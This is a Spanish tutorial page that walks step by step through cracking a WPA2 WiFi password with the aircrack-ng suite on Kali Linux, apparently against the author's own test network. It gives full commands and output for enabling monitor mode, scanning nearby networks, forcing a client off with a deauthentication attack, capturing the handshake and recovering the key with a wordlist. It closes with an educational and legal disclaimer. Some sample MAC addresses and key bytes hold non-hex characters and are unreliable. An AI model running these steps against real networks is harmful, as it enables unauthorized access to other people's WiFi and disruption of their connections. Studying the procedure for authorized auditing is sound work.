---
icon: router
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Aircrack-ng (Practica)

## Guía para Captura de Handshake y Análisis de Seguridad en Redes WiFi

### 1. Requisitos Iniciales

Para comenzar, necesitaremos un adaptador de red inalámbrico compatible con modo monitor e inyección de paquetes. En este caso, utilizaremos el **TP-LINK TL-WN722N versión 1**. Es importante destacar que versiones superiores (v2/v3) pueden presentar problemas de compatibilidad, por lo que se recomienda utilizar exclusivamente la **versión 1**.

Una vez iniciado **Kali Linux** e insertado el adaptador, podemos verificar su presencia ejecutando el siguiente comando:

```shell
ifconfig
```

La salida mostrará algo similar a:

```
eth0: <INFO_INTERFACE>

lo: <INFO_INTERFACE>

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
       ether ba:c3:be:31:7d:f7  txqueuelen 1000  (Ethernet)
```

Notamos que la interfaz aún no está en modo monitor.

***

### 2. Activar el Modo Monitor

#### Instalación de herramientas

Primero, instalamos la suite necesaria para la auditoría de redes WiFi:

```shell
sudo apt install aircrack-ng
```

#### Habilitar modo monitor

Luego, activamos el modo monitor en la interfaz inalámbrica:

```shell
sudo airmon-ng start wlan0 # Donde pone "wlan0" seria donde este tu TP-Link
```

Info:

```
Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    645 NetworkManager
   1083 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rtl8xxxu        TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]
                (monitor mode enabled)
```

Si aparecen advertencias relacionadas con procesos activos, como `NetworkManager` o `wpa_supplicant`, es recomendable detenerlos con:

```shell
sudo airmon-ng check kill
```

Repetimos el comando anterior para reactivar el modo monitor si es necesario.

***

### 3. Verificar que la Inyección Funciona

Podemos realizar una prueba rápida para comprobar que nuestro adaptador puede inyectar paquetes:

```shell
sudo aireplay-ng --test wlan0
```

Info:

```
05:19:18  Trying broadcast probe requests...
05:19:18  Injection is working!
05:19:20  Found 10 APs

05:19:20  Trying directed probe requests...
05:19:20  <BSSID> - channel: 6 - 'Congo-9390'
05:19:21  Ping (min/avg/max): 1.294ms/10.880ms/140.231ms Power: -70.00
05:19:21  30/30: 100%

05:19:21  <BSSID> - channel: 5 - 'DIGIFIBRA-7P2z_EXT'
05:19:21  Ping (min/avg/max): 3.173ms/16.181ms/46.011ms Power: -79.93
05:19:21  30/30: 100%

05:19:21  <BSSID> - channel: 6 - 'MIWIFI_kGLF'
05:19:22  Ping (min/avg/max): 2.028ms/15.667ms/54.673ms Power: -82.43
05:19:22  28/30:  93%

05:19:22  <BSSID> - channel: 6 - 'MIWIFI_test'
^C/23:  95%
```

Si la inyección es exitosa, el resultado incluirá respuestas de varios puntos de acceso (APs), indicando que el adaptador funciona correctamente.

***

### 4. Escaneo de Redes WiFi

Para enumerar todas las redes disponibles a nuestro alrededor:

```shell
sudo airodump-ng wlan0
```

Info:

```
CH  4 ][ Elapsed: 0 s ][ 2025-04-22 05:00                                                                                                                   
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                             
 <BSSID>  -80        2        0    0  11  130   WPA2 CCMP   PSK  MOVISTAR_4873
 <BSSID>  -67        2        0    0  10  270   WPA2 CCMP   PSK  <length:  0>
 <BSSID>  -66        3        0    0  10  270   WPA2 CCMP   PSK  <length:  0>
 <BSSID>  -69        1        0    0  10  270   WPA2 CCMP   PSK  Digideca
 <BSSID>  -76        4        0    0  10  270   WPA2 CCMP   PSK  Digideca
 <BSSID>  -93        2        0    0   8  195   WPA2 CCMP   PSK  MIWIFI_5G
 <BSSID>  -65        5        0    0  10  270   WPA2 CCMP   PSK  Digideca
 <BSSID>  -87        5        0    0   6   65   OPN              Salón.c,
 <BSSID>  -78        2        0    0   6  270   WPA2 CCMP   PSK  MIWIFI_5G_aHBw
 <BSSID>  -71        2        0    0   6  720   WPA2 CCMP   PSK  MIWIFI_yXzO
 <BSSID>  -73        3        0    0   6   65   OPN              Congo-9390
 01:9C:14:CO:29:R8  -60        3        0    0   10  195   WPA2 CCMP   PSK  MIWIFI_test                                                                       
 <BSSID>  -73        4        0    0   1  130   WPA2 CCMP   PSK  MOVISTAR_ABU0
 <BSSID>  -83        3        0    0   1  130   WPA2 CCMP   PSK  MiFibra-9A5C
 <BSSID>  -81        5        0    0   1  270   WPA2 CCMP   PSK  MECCUSES_7236
 <BSSID>  -93        3        1    0   1  130   WPA2 CCMP   PSK  MiFibra-9E5B
 <BSSID>  -76        3        2    0   3  260   WPA2 CCMP   PSK  DIGIFIBRA-8962
 <BSSID>  -82        2        0    0   1  130   WPA2 CCMP   PSK  MiFibra-A71A
 <BSSID>  -78        6        0    0   1  720   WPA2 CCMP   PSK  DIGIFIBRA-5GUY
 <BSSID>  -66        7        6    2   1  130   WPA2 CCMP   PSK  Livebox6-108A     
 <BSSID>  -58        9        8    3   1  195   WPA2 CCMP   PSK  Livebox6-108A     
 <BSSID>  -89        4        0    0   1  195   WPA2 CCMP   PSK  MIWIFI_4Kdc       
 <BSSID>  -65        6        0    0   1  130   WPA2 CCMP   PSK  MOVISTAR_AA50     
 <BSSID>  -55        3        0    0  11  270   WPA2 CCMP   PSK  Livebox6-108A     
 <BSSID>  -44        8        3    0  10  130   WPA2 CCMP   PSK  DIGIFIBRA-fg67                                                                    
Quitting...
```

Esto mostrará una lista de redes, donde identificaremos el **BSSID** (MAC del punto de acceso) y el **canal (CH)** de la red objetivo. Supongamos que seleccionamos la red `MIWIFI_test`, con:

* **BSSID**: `01:9C:14:CO:29:R8`
* **Canal**: `10`

***

### 5. Captura de Tráfico y Handshake

#### Iniciar escucha de tráfico

Ejecutamos el siguiente comando para guardar todo el tráfico de la red seleccionada en un archivo `.cap`:

> EJEMPLO:

```shell
sudo airodump-ng -c <CH> --bssid <BSSID> -w <NAME_NEW_FILE> <INTERFACE_MONITOR>
```

Quedaria algo asi en mi caso:

```shell
sudo airodump-ng -c 10 --bssid 01:9C:14:CO:29:R8 -w auditoria wlan0
```

Info:

```
05:01:26  Created capture file "auditoria.cap".

 CH  6 ][ Elapsed: 3 mins ][ 2025-04-22 05:04                                                                             
 BSSID        PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                         
 01:9C:14:CO:29:R8  -54 100     1525      245    0   10  195   WPA2 CCMP   PSK  MIWIFI_test     
                                                              
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                                    
```

Veremos que esta a la escucha de cualquier conexion al `Wifi` o cualquier trafico de red, por lo que si nos conectamos con un dispositivo al `Wifi` veremos lo siguiente:

```
05:01:26  Created capture file "auditoria.cap".

 CH  6 ][ Elapsed: 3 mins ][ 2025-04-22 05:04                                                                            
 BSSID        PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                         
 01:9C:14:CO:29:R8  -54 100     1525      245    0   10  195   WPA2 CCMP   PSK  MIWIFI_test     
                                                              
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                           
 01:9C:14:CO:29:R8  C5:64:F4:1A:78:K5  -30    1e- 1    276      318  EAPOL 
```

En este punto, comenzaremos a visualizar clientes (STATION) conectados a esa red. Una vez detectado alguno, podremos intentar capturar el handshake.

#### Forzar desconexión (Deauth)

Desde otra terminal, lanzamos un ataque de desautenticación para forzar la reconexión del cliente, momento en el cual podremos capturar el `handshake`:

> EJEMPLO:

```shell
sudo aireplay-ng -0 9 -a <BSSID> -c <STATION> <INTERFACE_MONITOR>
```

Nos quedaria de esta forma el comando en mi caso:

```shell
sudo aireplay-ng -0 9 -a 01:9C:14:CO:29:R8 -c C5:64:F4:1A:78:K5 wlan0
```

Info:

```
05:08:40  Waiting for beacon frame (BSSID: 01:9C:14:CO:29:R8) on channel 10
05:08:40  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 1|47 ACKs]
05:08:41  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 0|55 ACKs]
05:08:41  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 1|77 ACKs]
05:08:42  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 0|71 ACKs]
05:08:43  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 0|53 ACKs]
05:08:43  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 0|56 ACKs]
05:08:44  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 0|76 ACKs]
05:08:44  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 0|73 ACKs]
05:08:45  Sending 64 directed DeAuth (code 7). STMAC: [C5:64:F4:1A:78:K5] [ 1|62 ACKs]
```

Repetimos este paso hasta que en la interfaz de `airodump-ng` aparezca el mensaje:

```
05:01:26  Created capture file "auditoria.cap".

 CH  6 ][ Elapsed: 3 mins ][ 2025-04-22 05:04 ][ WPA handshake: 01:9C:14:CO:29:R8                                                                            
 BSSID        PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                         
 01:9C:14:CO:29:R8  -54 100     1525      245    0   10  195   WPA2 CCMP   PSK  MIWIFI_test     
                                                              
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                           
 01:9C:14:CO:29:R8  C5:64:F4:1A:78:K5  -30    1e- 1    276      318  EAPOL  
```

Especificamente:

```
WPA handshake: 01:9C:14:CO:29:R8
```

Esto confirma que el handshake se ha capturado correctamente.

***

### 6. Ataque de Diccionario

Con el archivo `.cap` en nuestro poder, procedemos a intentar descifrar la clave de la red utilizando un diccionario de contraseñas:

```shell
sudo aircrack-ng -b 01:9C:14:CO:29:R8 -w <WORDLIST> auditoria.cap
```

Cuando se encuentre la contraseña, se mostrará un mensaje como el siguiente:

```
Reading packets, please wait...
Opening auditoria.cap
Read 13707 packets.

1 potential targets

                               Aircrack-ng 1.7 

      [00:00:00] 6/7 keys tested (285.31 k/s) 

      Time left: 0 seconds                                      85.71%

                           KEY FOUND! [ robertocarlos ]


      Master Key     : D7 AF 77 96 6D 09 B8 D8 6C 8F 3F 4E A1 1E TF FR 
                       F1 HY 03 1D C6 90 64 G6 36 57 95 12 84 08 4A 59 

      Transient Key  : D4 80 66 70 92 FD 72 56 2D 15 A2 DB 05 00 18 A4 
                       8D E3 60 5F BB 2E AE 55 57 55 06 95 64 90 70 E9 
                       1E 6C 3F 5D 55 9B A3 0C 83 78 B9 B9 7E BC D3 90 
                       D2 05 21 75 E0 A4 6A 36 20 CC F9 9D 1E 00 00 00 

      EAPOL HMAC     : 17 0F A7 4C ED FG 5E 90 A7 67 BB 89 10 B8 2D 37
```

Con esto veremos que la contraseña seria `robertocarlos` del `Wifi` `MIWIFI_test`, por lo que habremos obtenido de contraseña de forma correcta.

***

### 7. Validación

Finalmente, probamos la contraseña encontrada (`robertocarlos`) conectándonos manualmente a la red objetivo para comprobar su validez, lo cual sera exitoso.

***

> ⚠️ **Nota Legal**: Esta guía tiene fines **educativos** y de **auditoría autorizada** exclusivamente. El uso no autorizado de estas técnicas en redes ajenas constituye un delito según la legislación vigente.
